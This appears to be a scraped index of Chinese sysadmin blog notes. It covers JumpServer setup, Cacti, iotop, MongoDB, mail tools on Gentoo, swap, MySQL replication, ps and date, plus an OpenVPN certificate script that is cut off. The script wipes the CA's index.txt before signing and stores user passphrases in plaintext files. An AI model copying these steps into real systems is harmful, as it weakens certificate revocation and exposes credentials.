.&#x2F;cocod start 后提示 Failed register terminal xxxx exist already 123456789解决方案：这是由于 coco 注册未成功造成的，需要重新注册 (能正常访问 jumpserver 页面后再处理)到 Jumpserver后台 会话管理-终端管理 删掉 coco 的注册必须到 Jumpserver后台 会话管理-终端管理 删掉 coco 的注册一定要先到 Jumpserver后台 会话管理-终端管理 删掉 coco 的注册$ cd &#x2F;opt&#x2F;coco &amp;&amp; .&#x2F;cocod stop$ rm &#x2F;opt&#x2F;coco&#x2F;keys&#x2F;.access_key # coco, 如果你是按文档安装的，key应该在这里，如果不存在key文件直接下一步$ .&#x2F;cocod start -d # 正常运行后到Jumpserver 会话管理-终端管理 里面接受coco注册 Jumpserver和coco服务开机启动123ls -lh &#x2F;etc&#x2F;rc.d&#x2F;rc.localchmod +x &#x2F;etc&#x2F;rc.d&#x2F;rc.local 1234567891011121314151617mkdir &#x2F;var&#x2F;scriptscd &#x2F;var&#x2F;scripts#cat jms.sh #!&#x2F;bin&#x2F;bashsource &#x2F;opt&#x2F;py3&#x2F;bin&#x2F;activate&#x2F;opt&#x2F;jumpserver&#x2F;jms start -d&#x2F;opt&#x2F;jumpserver&#x2F;jms status#cat coco.sh #!&#x2F;bin&#x2F;bashsource &#x2F;opt&#x2F;py3&#x2F;bin&#x2F;activate&#x2F;opt&#x2F;coco&#x2F;cocod start -d&#x2F;opt&#x2F;coco&#x2F;cocod statuschmod +x jms.sh coco.sh 123456#开机启动Jumpserverecho &quot;&#x2F;var&#x2F;scripts&#x2F;jms.sh &gt;&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot; &gt;&gt;&#x2F;etc&#x2F;rc.d&#x2F;rc.local#开机启动Cocoecho &quot;&#x2F;var&#x2F;scripts&#x2F;coco.sh &gt;&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot; &gt;&gt;&#x2F;etc&#x2F;rc.d&#x2F;rc.local 最后整体验证Jumpserver 服务1234567ssh admin@192.168.244.144 2222sftp admin@192.168.244.144 2222密码: admin如果都能登陆代表部署成功注：sftp默认上传的位置在资产的 &#x2F;tmp 目录下 排错 1Web访问Luna(代理jumpserver) 502错误，这是因为SELINUX未从配置文件关闭，重启机器selinux又正常启动了。解决方法：关闭即可。 官方文档：https://jumpserver.readthedocs.io/zh/docs/step_by_step.html","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"jumpserver","slug":"jumpserver","permalink":"https://garywu520.github.io/tags/jumpserver/"},{"name":"跳板机","slug":"跳板机","permalink":"https://garywu520.github.io/tags/%E8%B7%B3%E6%9D%BF%E6%9C%BA/"},{"name":"堡垒机","slug":"堡垒机","permalink":"https://garywu520.github.io/tags/%E5%A0%A1%E5%9E%92%E6%9C%BA/"}]},{"title":"Cacti流量叠加图形设置","slug":"Cacti流量叠加图形设置","date":"2018-10-19T06:19:25.000Z","updated":"2018-10-19T07:53:23.268Z","comments":true,"path":"2018/10/19/Cacti流量叠加图形设置/","link":"","permalink":"https://garywu520.github.io/2018/10/19/Cacti%E6%B5%81%E9%87%8F%E5%8F%A0%E5%8A%A0%E5%9B%BE%E5%BD%A2%E8%AE%BE%E7%BD%AE/","excerpt":"1cacti监控接口流量，有时候需求是：需要将多个监控图进行整合到一张图中并将加入的接口流量进行叠加，便于分析 1. 流量图整合-方法（1）Console –&gt;&gt; Graph Management –&gt;&gt; Add –&gt;&gt;直接点击Create","text":"1cacti监控接口流量，有时候需求是：需要将多个监控图进行整合到一张图中并将加入的接口流量进行叠加，便于分析 1. 流量图整合-方法（1）Console –&gt;&gt; Graph Management –&gt;&gt; Add –&gt;&gt;直接点击Create (2) 在新打开的对话框中输入Title –&gt;&gt; 点击底部的Create​ (3) 出现下面这个区域的时候,这时就可以添加数据源了，点击红色区域右上角Add （4）根据如下图示，添加需要整合的第一个接口0/1/1【注：添加第1个接口, Graph Item Type选择AREA】​ （5）接着添加需要整合的第2个接口1/1/1【注：添加第2个接口,Graph Item Type选择STACK 】 （6）完成后如下图 ​ 2. 创建图片下方的带宽实时数据​ (1) 继续点击Add, 如图​ ​ (2) 创建0/1/1接口的带宽数据 ，如图​ （3）同样的方法添加第二个端口，添加完成后如下图​ ​ (4) 最后,再把这两个接口的数据加起来。操作：继续点击Add ​ 配置完务必要保存！！！ ​ 3. 整合图形展示​ 这时候就可以在“Graph Trees”里面把这个整合图形，添加到Graphs中展示了 ​","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Cacti流量叠加图形","slug":"Cacti流量叠加图形","permalink":"https://garywu520.github.io/tags/Cacti%E6%B5%81%E9%87%8F%E5%8F%A0%E5%8A%A0%E5%9B%BE%E5%BD%A2/"},{"name":"Cacti整合图形","slug":"Cacti整合图形","permalink":"https://garywu520.github.io/tags/Cacti%E6%95%B4%E5%90%88%E5%9B%BE%E5%BD%A2/"},{"name":"Graph","slug":"Graph","permalink":"https://garywu520.github.io/tags/Graph/"}]},{"title":"linux查看进程所占用的磁盘io","slug":"linux查看进程所占用的磁盘io","date":"2018-10-19T02:24:48.000Z","updated":"2018-10-19T04:06:28.977Z","comments":true,"path":"2018/10/19/linux查看进程所占用的磁盘io/","link":"","permalink":"https://garywu520.github.io/2018/10/19/linux%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E6%89%80%E5%8D%A0%E7%94%A8%E7%9A%84%E7%A3%81%E7%9B%98io/","excerpt":"1如果磁盘io很高，会导致磁盘读或写过慢，进而出现CPU等待IO的严重现象。 源码安装iotop命令官方：下载 12345678wget http:&#x2F;&#x2F;guichaz.free.fr&#x2F;iotop&#x2F;files&#x2F;iotop-0.6.tar.gztar -zxvf iotop-0.6.tar.gz cd iotop-0.6#安装iotop命令到&#x2F;usr&#x2F;bin目录.&#x2F;setup.py installwhich iotop","text":"1如果磁盘io很高，会导致磁盘读或写过慢，进而出现CPU等待IO的严重现象。 源码安装iotop命令官方：下载 12345678wget http:&#x2F;&#x2F;guichaz.free.fr&#x2F;iotop&#x2F;files&#x2F;iotop-0.6.tar.gztar -zxvf iotop-0.6.tar.gz cd iotop-0.6#安装iotop命令到&#x2F;usr&#x2F;bin目录.&#x2F;setup.py installwhich iotop 使用iotop123强烈建议使用&quot;-o&quot; 或&quot;--only&quot; 选项来查看实际占用高的I&#x2F;O进程或线程，而不是查看所有的进程如：iotop -o 高级使用12345非交互打印io占用较高的进程iotop -botqqq --iter&#x3D;2--iter&#x3D;3意思是：在退出之前设置迭代次数(默认情况下永不退出)。这个参数在非交互模式下最有用。可根据实际需求调整上述参数。 参数详解1# man iotop 1234567891011选项：(1) 使用--version选项来查看版本号并退出。(2) 使用-h选项来查看使用的信息。(3) 使用-o选项检查进程或线程。(4) 使用-b选项，非交互模式(5) 使用-t选项在每一行添加一个时间戳(6) 使用-p PID列出所有进程&#x2F;线程监视。(7) 使用-u用户选项列出所有用户进行监视。(8) 使用-P选项仅列出进程。 通常iotop显示所有线程。(9)使用-a 用于累计显示I&#x2F;O，而不是带宽。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"linux","slug":"linux","permalink":"https://garywu520.github.io/tags/linux/"},{"name":"io","slug":"io","permalink":"https://garywu520.github.io/tags/io/"},{"name":"磁盘io","slug":"磁盘io","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98io/"},{"name":"iotop","slug":"iotop","permalink":"https://garywu520.github.io/tags/iotop/"}]},{"title":"查询mongo数据","slug":"查询mongo数据","date":"2018-10-18T06:17:12.000Z","updated":"2018-10-18T07:19:43.591Z","comments":true,"path":"2018/10/18/查询mongo数据/","link":"","permalink":"https://garywu520.github.io/2018/10/18/%E6%9F%A5%E8%AF%A2mongo%E6%95%B0%E6%8D%AE/","excerpt":"","text":"1简单整理下查询mongo数据方法 进入mongo数据库123456mongo 10.0.0.200:27017rs.slaveOk(); 让从库支持读操作show dbs; 查询数据库use video; 进入数据库show tables; 查询关系型表show collections； 查询所有表（集合） 查询数据123SECONDARY&gt; db.表名.find()这个命令类似于mysql数据库的：select from 表名; 如果表过大，需要使用limit限制行数，否则可能对库造成很大压力。 1SECONDARY&gt; db.表名.find().limit(10) 查看前10行数据","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mongo","slug":"mongo","permalink":"https://garywu520.github.io/tags/mongo/"},{"name":"查询mongo","slug":"查询mongo","permalink":"https://garywu520.github.io/tags/%E6%9F%A5%E8%AF%A2mongo/"},{"name":"limit","slug":"limit","permalink":"https://garywu520.github.io/tags/limit/"}]},{"title":"sendmail发送邮件","slug":"sendmail发送邮件","date":"2018-10-18T03:01:03.000Z","updated":"2018-10-19T04:11:55.579Z","comments":true,"path":"2018/10/18/sendmail发送邮件/","link":"","permalink":"https://garywu520.github.io/2018/10/18/sendmail%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/","excerpt":"","text":"123456789Gentoo系统模板内置了ssmtp软件，可直接使用sendmail命令发送即# emerge --ask mail-mta&#x2F;ssmtp# cat &#x2F;etc&#x2F;ssmtp&#x2F;ssmtp.conf root&#x3D;mailhub&#x3D;mail.xxx:25rewriteDomain&#x3D;mail.xxx.comhostname&#x3D;mail.xxx.comFromLineOverride&#x3D;YES 安装mailx12eix mailxemerge mail-client&#x2F;mailx 邮件发送命令1echo -e &quot;this is test\\n Is true.&quot; |mail -s &quot;test&quot; mail@qq.com 12也可进行如下命令测试，不建议echo &quot;主题&quot; |sendmail mail@qq.com","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mail","slug":"mail","permalink":"https://garywu520.github.io/tags/mail/"},{"name":"mailx","slug":"mailx","permalink":"https://garywu520.github.io/tags/mailx/"},{"name":"sendmail","slug":"sendmail","permalink":"https://garywu520.github.io/tags/sendmail/"}]},{"title":"gentoo emerge postfix","slug":"gentoo-emerge-postfix","date":"2018-10-15T08:06:44.000Z","updated":"2018-10-15T08:14:34.771Z","comments":true,"path":"2018/10/15/gentoo-emerge-postfix/","link":"","permalink":"https://garywu520.github.io/2018/10/15/gentoo-emerge-postfix/","excerpt":"12gentoo系统中，安装某些包的过程中，出现blocking的情况，也就是出现了冲突。下面以安装postfix为例，简单记录下","text":"12gentoo系统中，安装某些包的过程中，出现blocking的情况，也就是出现了冲突。下面以安装postfix为例，简单记录下 错误提示12345678Gentoo 安装postfix，但如果系统中默认安装了ssmtp，就会出现blocking无法安装的情况。冲突的软件会列出来。错误提示：[blocks B] mail-mta&#x2F;postfix (&quot;mail-mta&#x2F;postfix&quot; is blocking mail-mta&#x2F;ssmtp-2.64-r2)[blocks B] &gt;&#x3D;mail-mta&#x2F;ssmtp-2.64-r2[mta] (&quot;&gt;&#x3D;mail-mta&#x2F;ssmtp-2.64-r2[mta]&quot; is blocking mail-mta&#x2F;postfix-2.9.4)* Error: The above package list contains packages which cannot be* installed at the same time on the same system. 解决方法1234解决方法如下：emerge --ask -C ssmtp 检查系统中是否安装有ssmtp,如果有按照提示卸载emerge --ask postfix 再安装就正常了","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"emerge","slug":"emerge","permalink":"https://garywu520.github.io/tags/emerge/"},{"name":"gentoo","slug":"gentoo","permalink":"https://garywu520.github.io/tags/gentoo/"},{"name":"postfix","slug":"postfix","permalink":"https://garywu520.github.io/tags/postfix/"},{"name":"install","slug":"install","permalink":"https://garywu520.github.io/tags/install/"}]},{"title":"查看和释放swap内存","slug":"查看和释放swap内存","date":"2018-10-12T02:09:07.000Z","updated":"2018-10-12T02:28:30.938Z","comments":true,"path":"2018/10/12/查看和释放swap内存/","link":"","permalink":"https://garywu520.github.io/2018/10/12/%E6%9F%A5%E7%9C%8B%E5%92%8C%E9%87%8A%E6%94%BEswap%E5%86%85%E5%AD%98/","excerpt":"关于内存耗尽总结12345678要达到释放缓存的目的，我们首先需要了解下关键的配置文件&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches。这个文件中记录了缓存释放的参数，默认值为0，也就是不释放缓存。他的值可以为0~3之间的任意数字，代表着不同的含义：0 – 不释放1 – 释放页缓存2 – 释放dentries和inodes3 – 释放所有缓存知道了参数后，我们就可以根据我们的需要，使用下面的指令来进行操作。 swap磁盘占用过高原因分析12345通过此命令查看内存被哪些进程占用（单位是MByte）for i in &#96;cd &#x2F;proc;ls |grep &quot;^[0-9]&quot;|awk &#39; $0 &gt;100&#39;&#96; ;do awk &#39;&#x2F;Swap:&#x2F;&#123;a&#x3D;a+$2&#125;END&#123;print &#39;&quot;$i&quot;&#39;,a&#x2F;1024&quot;M&quot;&#125;&#39; &#x2F;proc&#x2F;$i&#x2F;smaps ;done 2&gt;&amp;1 |sort -k2nr |head注：以上结果输出PID与内存占用大小，通过PID可以找到对应进程","text":"关于内存耗尽总结12345678要达到释放缓存的目的，我们首先需要了解下关键的配置文件&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches。这个文件中记录了缓存释放的参数，默认值为0，也就是不释放缓存。他的值可以为0~3之间的任意数字，代表着不同的含义：0 – 不释放1 – 释放页缓存2 – 释放dentries和inodes3 – 释放所有缓存知道了参数后，我们就可以根据我们的需要，使用下面的指令来进行操作。 swap磁盘占用过高原因分析12345通过此命令查看内存被哪些进程占用（单位是MByte）for i in &#96;cd &#x2F;proc;ls |grep &quot;^[0-9]&quot;|awk &#39; $0 &gt;100&#39;&#96; ;do awk &#39;&#x2F;Swap:&#x2F;&#123;a&#x3D;a+$2&#125;END&#123;print &#39;&quot;$i&quot;&#39;,a&#x2F;1024&quot;M&quot;&#125;&#39; &#x2F;proc&#x2F;$i&#x2F;smaps ;done 2&gt;&amp;1 |sort -k2nr |head注：以上结果输出PID与内存占用大小，通过PID可以找到对应进程 释放内存方案1234方案1： 重启占用swap最高的进程方法2： 关闭swap分区 有时候并不能查看到哪些进程占用swap，则需要先关闭swap分区再开启 关闭swap分区注意事项和步骤1234567891011121314151，确保系统空闲物理内存大于swap已用内存，否则会导致服务器宕机！2，先清理内存cache，空出足够内存 sync echo &quot;3&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches3，关闭swap分区，这个过程需要等待 swapon -s 查看swap挂载分区 swapoff -a 或 swapoff &#x2F;dev&#x2F;sda54，swap分区释放后，恢复swap分区 swapon -a 或 swapon &#x2F;dev&#x2F;sda55，恢复内存cache的设置 echo &quot;0&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches 1free -m 再次查看即可","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"cache","slug":"cache","permalink":"https://garywu520.github.io/tags/cache/"},{"name":"swap","slug":"swap","permalink":"https://garywu520.github.io/tags/swap/"},{"name":"swapon","slug":"swapon","permalink":"https://garywu520.github.io/tags/swapon/"},{"name":"swapoff","slug":"swapoff","permalink":"https://garywu520.github.io/tags/swapoff/"},{"name":"交换分区","slug":"交换分区","permalink":"https://garywu520.github.io/tags/%E4%BA%A4%E6%8D%A2%E5%88%86%E5%8C%BA/"}]},{"title":"ESXI安装openstack注意事项","slug":"ESXI安装openstack注意事项","date":"2018-09-26T09:19:22.000Z","updated":"2018-09-26T09:50:59.993Z","comments":true,"path":"2018/09/26/ESXI安装openstack注意事项/","link":"","permalink":"https://garywu520.github.io/2018/09/26/ESXI%E5%AE%89%E8%A3%85openstack%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","excerpt":"","text":"如在esxi中安装openstack，则esxi需要配置混杂模式，否则vm无法上网。配置方法12345678(1)使用 vSphere Client 登录到 ESXi&#x2F;ESX 主机或 vCenter Server。(2)在清单中选择 ESXi&#x2F;ESX 主机。(3)单击配置选项卡。(4)在“硬件”部分，单击网络。(5)单击要启用混杂模式的虚拟交换机的属性。(6)选择要修改的虚拟交换机或端口组，然后单击编辑。(7)单击安全选项卡。(8)从“混杂模式”下拉菜单中，单击接受。 参考：官网-中文","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Openstack","slug":"Openstack","permalink":"https://garywu520.github.io/tags/Openstack/"},{"name":"esxi","slug":"esxi","permalink":"https://garywu520.github.io/tags/esxi/"},{"name":"混杂模式","slug":"混杂模式","permalink":"https://garywu520.github.io/tags/%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F/"}]},{"title":"mysql主从库同步出现主键错误-分析","slug":"mysql主从库同步出现主键错误-分析","date":"2018-09-18T07:45:38.000Z","updated":"2018-09-21T09:30:54.544Z","comments":true,"path":"2018/09/18/mysql主从库同步出现主键错误-分析/","link":"","permalink":"https://garywu520.github.io/2018/09/18/mysql%E4%B8%BB%E4%BB%8E%E5%BA%93%E5%90%8C%E6%AD%A5%E5%87%BA%E7%8E%B0%E4%B8%BB%E9%94%AE%E9%94%99%E8%AF%AF-%E5%88%86%E6%9E%90/","excerpt":"1mysql主库数据量TB级别，废了九牛二虎之力做了从库，一切正常。过了没几天，出现了主键等错误。 原因分析 1造成此问题的原因 与主库数据量几乎没有关系，很大可能是因为从库被写入了数据，导致主从主键不一致。","text":"1mysql主库数据量TB级别，废了九牛二虎之力做了从库，一切正常。过了没几天，出现了主键等错误。 原因分析 1造成此问题的原因 与主库数据量几乎没有关系，很大可能是因为从库被写入了数据，导致主从主键不一致。 建议 12345671. 从库启用read_only, 配置文件添加如下配置【也可动态配置，无需重启服务】： read_only &#x3D; ON super_read_only &#x3D; ON 2. 主从均开启GTID3. 主从均使用ROW格式 临时解决 123&#x2F;usr&#x2F;sbin&#x2F;mysql -uroot -p -e &quot;set global sql_slave_skip_counter&#x3D;1;start slave;&quot;使用此命令来跳过一个事务","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"主从同步","slug":"主从同步","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"主键错误","slug":"主键错误","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E9%94%AE%E9%94%99%E8%AF%AF/"}]},{"title":"重温ps命令","slug":"重温ps-aux命令","date":"2018-09-14T02:48:20.000Z","updated":"2018-09-14T03:04:24.028Z","comments":true,"path":"2018/09/14/重温ps-aux命令/","link":"","permalink":"https://garywu520.github.io/2018/09/14/%E9%87%8D%E6%B8%A9ps-aux%E5%91%BD%E4%BB%A4/","excerpt":"12345Linux下最常用的2个命令：ps -efps aux来重新温习下他们两个命令的区别","text":"12345Linux下最常用的2个命令：ps -efps aux来重新温习下他们两个命令的区别 ps -ef能输出什么内容：123456[root@gfw_proxy_15 ~]# ps -ef|headUID PID PPID C STIME TTY TIME CMDroot 8 2 0 Jul13 ? 00:00:00 [rcu_bh]root 9 2 0 Jul13 ? 00:00:00 [rcuob&#x2F;0]root 10 2 0 Jul13 ? 00:00:00 [rcuob&#x2F;1]root 11 2 0 Jul13 ? 00:00:00 [rcuob&#x2F;2] 1234567UID &#x2F;&#x2F;用户ID、但输出的是用户名PID &#x2F;&#x2F;进程的IDPPID &#x2F;&#x2F;父进程IDC &#x2F;&#x2F;进程占用CPU的百分比STIME &#x2F;&#x2F;进程启动到现在的时间TTY &#x2F;&#x2F;该进程在那个终端上运行，若与终端无关，则显示? 若为pts&#x2F;0等，则表示由网络连接主机进程。CMD &#x2F;&#x2F;命令的名称和参数 ps aux能输出什么内容？12345[root@gfw_proxy_15 ~]# ps aux|headUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 123308 3820 ? Ss Jul13 45:58 &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;systemd...root 2 0.0 0.0 0 0 ? S Jul13 0:04 [kthreadd]root 3 0.0 0.0 0 0 ? S Jul13 0:14 [ksoftirqd&#x2F;0] 123456789USER &#x2F;&#x2F;用户名PID &#x2F;&#x2F;PID%CPU &#x2F;&#x2F;进程占用的CPU百分比%MEM &#x2F;&#x2F;占用内存的百分比VSZ &#x2F;&#x2F;该进程使用的虚拟內存量（KB）RSS &#x2F;&#x2F;该进程占用的固定內存量（KB）（驻留中页的数量）STAT &#x2F;&#x2F;进程的状态START &#x2F;&#x2F;该进程被触发启动时间TIME &#x2F;&#x2F;该进程实际使用CPU运行的时间 查看进程占用的CPU和内存大小12345# ps aux |grep openvpnroot 18493 0.7 0.1 12336 3888 ? Sl Sep13 7:54 &#x2F;usr&#x2F;sbin&#x2F;openvpn.....上面第3列是CPU占用百分比；上面第6列，是进程所占用的固定内存,单位k(除以1000单位是M)","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ps","slug":"ps","permalink":"https://garywu520.github.io/tags/ps/"},{"name":"aux","slug":"aux","permalink":"https://garywu520.github.io/tags/aux/"},{"name":"查看进程内存","slug":"查看进程内存","permalink":"https://garywu520.github.io/tags/%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98/"}]},{"title":"date时间戳转换","slug":"date时间戳转换","date":"2018-09-13T06:12:01.000Z","updated":"2018-09-13T06:18:27.767Z","comments":true,"path":"2018/09/13/date时间戳转换/","link":"","permalink":"https://garywu520.github.io/2018/09/13/date%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E6%8D%A2/","excerpt":"1linux时间戳转换 查看当前unix时间戳 1234date +%s变量赋值Now_UNIX&#x3D;&#96;date +%s&#96;","text":"1linux时间戳转换 查看当前unix时间戳 1234date +%s变量赋值Now_UNIX&#x3D;&#96;date +%s&#96; 标准时间转unix 1234date -d &quot;2017-08-01 00:00:00&quot; +%s变量赋值UNIX&#x3D;&#96;date -d &quot;2017-08-01 00:00:00&quot; +%s&#96; unix转标准时间 1date -d &quot;@1536819453&quot;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"unix","slug":"unix","permalink":"https://garywu520.github.io/tags/unix/"},{"name":"date","slug":"date","permalink":"https://garywu520.github.io/tags/date/"},{"name":"时间戳","slug":"时间戳","permalink":"https://garywu520.github.io/tags/%E6%97%B6%E9%97%B4%E6%88%B3/"},{"name":"time","slug":"time","permalink":"https://garywu520.github.io/tags/time/"}]},{"title":"基于easyrsa3自动化实现openvpn用户证书的创建与吊销","slug":"基于easyrsa3自动化实现openvpn用户证书的创建与吊销","date":"2018-09-12T08:36:25.000Z","updated":"2018-09-12T08:47:16.343Z","comments":true,"path":"2018/09/12/基于easyrsa3自动化实现openvpn用户证书的创建与吊销/","link":"","permalink":"https://garywu520.github.io/2018/09/12/%E5%9F%BA%E4%BA%8Eeasyrsa3%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%9E%E7%8E%B0openvpn%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E7%9A%84%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%90%8A%E9%94%80/","excerpt":"1234写个脚本，一键创建用户证书与吊销证书，使用格式：想要的效果--使用方法sh vpn.sh add&#x2F;del username 1234567前提：(1)自己能通过SSH登陆到自己，即ssh免密登陆(2)提前安装好所需包 yum install -y expect expect-devel tcl 问题：为什么要这么做？因为自己的openvpn证书基于easyrsa3的版本进行创建，而此版本并不能使用pkitool的参数来方便快捷的解决免交互的问题【pkitool不支持easyrsa3, 只适用于easyrsa2】，所以只能借助于expect实现免交互","text":"1234写个脚本，一键创建用户证书与吊销证书，使用格式：想要的效果--使用方法sh vpn.sh add&#x2F;del username 1234567前提：(1)自己能通过SSH登陆到自己，即ssh免密登陆(2)提前安装好所需包 yum install -y expect expect-devel tcl 问题：为什么要这么做？因为自己的openvpn证书基于easyrsa3的版本进行创建，而此版本并不能使用pkitool的参数来方便快捷的解决免交互的问题【pkitool不支持easyrsa3, 只适用于easyrsa2】，所以只能借助于expect实现免交互 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#!&#x2F;bin&#x2F;bashif [ $# !&#x3D; 2 ];then echo &quot;USAGE: sh $0 add&#x2F;del username&quot; exit 1;fi#定义变量AD&#x3D;$1USER&#x3D;$2PASS&#x3D;&#96;head -c 100 &#x2F;dev&#x2F;urandom | tr -dc a-z0-9A-Z |head -c 16&#96;DIR1&#x3D;&#x2F;opt&#x2F;easy-rsa-3.0.5&#x2F;easyrsa3DIR2&#x3D;&#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3TMP&#x3D;&#x2F;tmp&#x2F;openvpn.ept#解决签约错误cd $DIR2&#x2F;pkiif [ -f index.txt ];then rm -f index.txt &amp;&amp; touch index.txtfi#创建客户端证书if [ &quot;$AD&quot; &#x3D;&#x3D; &quot;add&quot; ];thencat &gt; $TMP &lt;&lt; EOF#!&#x2F;usr&#x2F;bin&#x2F;expectspawn ssh -p22 root@192.168.0.11set timeout -1expect &quot;]#&quot;send -- &quot;cd $DIR1\\r&quot;sleep 2expect &quot;]#&quot;send -- &quot;echo &#39;yes&#39;|.&#x2F;easyrsa gen-req $USER\\r&quot;sleep 5expect &quot;phrase:&quot;send -- &quot;$PASS\\r&quot;expect &quot;phrase:&quot;send -- &quot;$PASS\\r&quot;expect &quot;]:&quot;send -- &quot;\\r&quot;sleep 3expect &quot;]#&quot; send -- &quot;cd $DIR2\\r&quot;expect &quot;]#&quot;send -- &quot;.&#x2F;easyrsa import-req $DIR1&#x2F;pki&#x2F;reqs&#x2F;$USER.req $USER\\r&quot; sleep 3expect &quot;]#&quot;send -- &quot;.&#x2F;easyrsa sign client $USER\\r&quot;expect &quot;details: &quot;send -- &quot;yes\\r&quot;expect &quot;key:&quot;send -- &quot;CA passwd\\r&quot;expect &quot;]#&quot;send -- &quot;exit\\r&quot;expect eofEOF#运行expect脚本pass_file&#x3D;$DIR1&#x2F;pass_filestat_file&#x3D;&#x2F;tmp&#x2F;openvpn_add_del.logecho &quot;$USER $PASS&quot; &gt;&gt;$pass_fileuserpass&#x3D;&#96;tail -1 $pass_file&#96;echo &quot;#..................................#&quot;echo &quot; OVPN用户账号自动创建中...请稍等 &quot;echo &quot;#..................................#&quot;&#x2F;usr&#x2F;bin&#x2F;expect -f $TMP &gt;$stat_fileif [ $? -ne 0 ];then echo &quot;用户证书文件创建异常,请检查&quot;fi#拷贝crt&#x2F;keymkdir -p $DIR1&#x2F;users&#x2F;$USERcp $DIR2&#x2F;pki&#x2F;issued&#x2F;$USER.crt $DIR1&#x2F;users&#x2F;$USER&#x2F;cp $DIR1&#x2F;pki&#x2F;private&#x2F;$USER.key $DIR1&#x2F;users&#x2F;$USER&#x2F;echo &quot;#.....用户账号创建完成,详情如下........#&quot;echo &quot; &quot;echo &quot;用户crt&#x2F;key下载目录：$DIR1&#x2F;users&#x2F;$USER&quot;echo &quot;用户证书密码[请牢记]: $userpass&quot;echo &quot; &quot;echo &quot;#......................................#&quot;#写入随机数到文件,用于sync md5变更依据echo &quot;$PASS&quot; &gt;&gt;&#x2F;tmp&#x2F;ovpn_create.logrm $TMPfi#吊销用户证书if [ &quot;$AD&quot; &#x3D;&#x3D; &quot;del&quot; ];thenTMP2&#x3D;&#x2F;tmp&#x2F;ovpn_revoke.eptstat_file2&#x3D;&#x2F;tmp&#x2F;ovpn_revoke.logcat &gt; $TMP2 &lt;&lt; EOF#!&#x2F;usr&#x2F;bin&#x2F;expectspawn ssh -p22 root@192.168.0.11set timeout -1expect &quot;]#&quot;send -- &quot;cd $DIR2\\r&quot;expect &quot;]#&quot;send -- &quot;.&#x2F;easyrsa revoke $USER\\r&quot;expect &quot;revocation: &quot;send -- &quot;yes\\r&quot;expect &quot;key:&quot;send -- &quot;CA passwd\\r&quot;expect &quot;]#&quot;send -- &quot;.&#x2F;easyrsa gen-crl\\r&quot;expect &quot;key:&quot;send -- &quot;CA passwd\\r&quot;expect &quot;]#&quot;send -- &quot;exit\\r&quot;expect eofEOFecho &quot;#..................................#&quot;echo &quot; OVPN账号自动吊销中...请稍等 &quot;echo &quot;#..................................#&quot;&#x2F;usr&#x2F;bin&#x2F;expect -f $TMP2 &gt;$&#123;stat_file2&#125;if [ $? -ne 0 ];then echo &quot;用户证书吊销出现问题,请检查&quot;fi\\cp &#x2F;etc&#x2F;openvpn&#x2F;easy-rsa&#x2F;easyrsa3&#x2F;pki&#x2F;crl.pem &#x2F;etc&#x2F;openvpn&#x2F;num1&#x3D;&#96;ps -ef|grep &quot;server.conf&quot;|grep -v grep|awk &#39;&#123;print $2&#125;&#39;&#96;kill -9 $num1 &amp;&amp; sleep 2 